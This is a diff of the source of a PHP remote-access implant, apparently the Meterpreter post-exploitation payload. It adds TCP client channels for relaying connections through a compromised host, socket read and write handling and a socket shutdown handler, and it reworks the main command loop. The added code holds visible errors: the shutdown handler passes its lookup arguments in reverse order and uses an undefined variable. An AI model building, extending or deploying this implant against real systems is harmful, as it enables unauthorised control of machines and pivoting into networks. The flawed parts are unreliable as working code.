@@ -97,16 +97,16 @@ define("CHANNEL_CLASS_POOL",     3);
 #
 # TLV Meta Types
 #
-define("TLV_META_TYPE_NONE",    (   0   ));
-define("TLV_META_TYPE_STRING",  (1 << 16));
-define("TLV_META_TYPE_UINT",    (1 << 17));
-define("TLV_META_TYPE_RAW",     (1 << 18));
-define("TLV_META_TYPE_BOOL",    (1 << 19));
+define("TLV_META_TYPE_NONE",       (   0   ));
+define("TLV_META_TYPE_STRING",     (1 << 16));
+define("TLV_META_TYPE_UINT",       (1 << 17));
+define("TLV_META_TYPE_RAW",        (1 << 18));
+define("TLV_META_TYPE_BOOL",       (1 << 19));
 define("TLV_META_TYPE_COMPRESSED", (1 << 29));
-define("TLV_META_TYPE_GROUP",   (1 << 30));
-define("TLV_META_TYPE_COMPLEX", (1 << 31));
+define("TLV_META_TYPE_GROUP",      (1 << 30));
+define("TLV_META_TYPE_COMPLEX",    (1 << 31));
 # not defined in original
-define("TLV_META_TYPE_MASK",    (1<<31)+(1<<30)+(1<<19)+(1<<18)+(1<<17)+(1<<16));
+define("TLV_META_TYPE_MASK",    (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16));
 
 #
 # TLV base starting points
@@ -565,6 +565,21 @@ function stdapi_sys_process_kill($req, &$pkt) {
 }
 }
 
+if (!function_exists('stdapi_net_socket_tcp_shutdown')) {
+function stdapi_net_socket_tcp_shutdown($req, &$pkt) {
+    global $channels;
+    $cid_tlv = packet_get_tlv(TLV_TYPE_CHANNEL_ID, $req);
+    $c = get_channel_by_id($cid_tlv['value']);
+
+    if ($c && $c['type'] == 'socket') {
+        @socket_shutdown($c[0], $how);
+        $ret = ERROR_SUCCESS;
+    } else {
+        $ret = ERROR_FAILURE;
+    }
+    return $ret;
+}
+}
 # END STDAPI
 
 
@@ -589,9 +604,33 @@ function channel_create_stdapi_fs_file($req, &$pkt) {
     $fd = @fopen($fpath_tlv['value'], $mode_tlv['value']);
 
     if (is_resource($fd)) {
-        array_push($channels, array(0 => $fd, 1 => $fd));
+        array_push($channels, array(0 => $fd, 1 => $fd, 'type' => 'stream'));
         $id = count($channels) - 1;
         my_print("Created new channel $fd, with id $id");
+        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
+        return ERROR_SUCCESS;
+    } else {
+        my_print("Failed to open");
+    }
+    return ERROR_FAILURE;
+}
+
+
+function channel_create_stdapi_net_tcp_client($req, &$pkt) {
+    global $channels;
+    $peer_host_tlv = packet_get_tlv($req, TLV_TYPE_PEER_HOST);
+    $peer_port_tlv = packet_get_tlv($req, TLV_TYPE_PEER_PORT);
+    $local_host_tlv = packet_get_tlv($req, TLV_TYPE_LOCAL_HOST);
+    $local_port_tlv = packet_get_tlv($req, TLV_TYPE_LOCAL_PORT);
+    $retries_tlv = packet_get_tlv($req, TLV_TYPE_CONNECT_RETRIES);
+
+    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+	$res = socket_connect($sock, $peer_host_tlv['value'], $peer_port_tlv['value']);
+
+    if (is_resource($sock)) {
+        array_push($channels, array(0 => $sock, 1 => $sock, 'type' => 'socket'));
+        $id = count($channels) - 1;
+        my_print("Created new channel $sock, with id $id");
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
         return ERROR_SUCCESS;
     } else {
@@ -629,7 +668,6 @@ function core_channel_eof($req, &$pkt) {
     my_print("doing channel eof");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
     $c = get_channel_by_id($chan_tlv['value']);
-    var_dump($c);
 
     if ($c) {
         if (@feof($c[1])) {
@@ -702,14 +740,22 @@ function core_channel_close($req, &$pkt) {
 }
 
 # Libraries are sent as a zlib-compressed blob.  Unfortunately, zlib support is
-# not default in non-Windows versions of PHP so we need some way to indicate to
-# the client that we can't handle compressed blobs.  Until then, don't
-# actually implement loadlib yet.  Maybe someday we'll have
-# ext_server_stdapi.php or whatever.  For now just return success.
+# not default in non-Windows versions of PHP or anything before 4.3.0 so we
+# need some way to indicate to the client that we can't handle compressed
+# blobs.  Until then, don't actually implement loadlib yet.  Maybe someday
+# we'll have ext_server_stdapi.php or whatever.  For now just return success.
 function core_loadlib($req, &$pkt) {
     my_print("doing core_loadlib (no-op)");
+    $data_tlv = packet_get_tlv($req, TLV_TYPE_DATA);
+    #if (!$data_tlv) {
+    #    my_print(hexdump($req, false, false, true));
+    #}
     return ERROR_SUCCESS;
 }
+
+
+
+
 
 
 ##
@@ -731,8 +777,11 @@ function get_channel_by_id($chan_id) {
 function channel_write($chan_id, $data) {
     $c = get_channel_by_id($chan_id);
     if ($c && is_resource($c[0])) {
-        var_dump($c);
-        return fwrite($c[0], $data);
+        if ($c['type'] == 'socket') {
+            return socket_write($c[0], $data);
+        } else {
+            return fwrite($c[0], $data);
+        }
     } else {
         return false;
     }
@@ -741,8 +790,11 @@ function channel_write($chan_id, $data) {
 function channel_read($chan_id, $len) {
     $c = get_channel_by_id($chan_id);
     if ($c && is_resource($c[1])) {
-        var_dump($c);
-        $result = fread($c[1], $len);
+        if ($c['type'] == 'socket') {
+            $result = socket_read($c[1], $len);
+        } else {
+            $result = fread($c[1], $len);
+        }
         return $result;
     } else {
         return false;
@@ -829,7 +881,8 @@ function packet_add_tlv(&$pkt, $tlv) {
 }
 
 function packet_get_tlv($pkt, $type) {
-    #my_print("Looking for a tlv of type $type");
+    my_print("Looking for a tlv of type $type");
+    # Start at offset 8 to skip past the packet header
     $offset = 8;
     while ($offset < strlen($pkt)) {
         $tlv = unpack("Nlen/Ntype", substr($pkt, $offset, 8));
@@ -901,7 +954,6 @@ if ($listen) {
 	$ipaddr = '127.0.0.1';
 	$msgsock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
 	$res = socket_connect($msgsock,$ipaddr,$port);
-	my_print($res);
 	if (!$res) {
 		die();
 	}
@@ -919,8 +971,9 @@ while (FALSE !== socket_select($r=$socket_readers, $w=NULL, $e=NULL, 1)) {
         if ($ready == $msgsock) {
             $request = socket_read($msgsock, 8, PHP_BINARY_READ);
             if (FALSE==$request) { 
-                $read_failed = true;
-                break; 
+                # We failed on the main socket.  There's no way to continue, so
+                # break all the way out.
+                break 2; 
             }
             $a = unpack("Nlen/Ntype", $request);
             # length of the whole packet, including header
@@ -942,9 +995,6 @@ while (FALSE !== socket_select($r=$socket_readers, $w=NULL, $e=NULL, 1)) {
 
             }
         }
-    }
-    if ($read_failed) {
-        break;
     }
     #if (0 < count($file_readers)) {
     #    stream_select($r=$file_readers, $w=NULL, $e=NULL, 0);
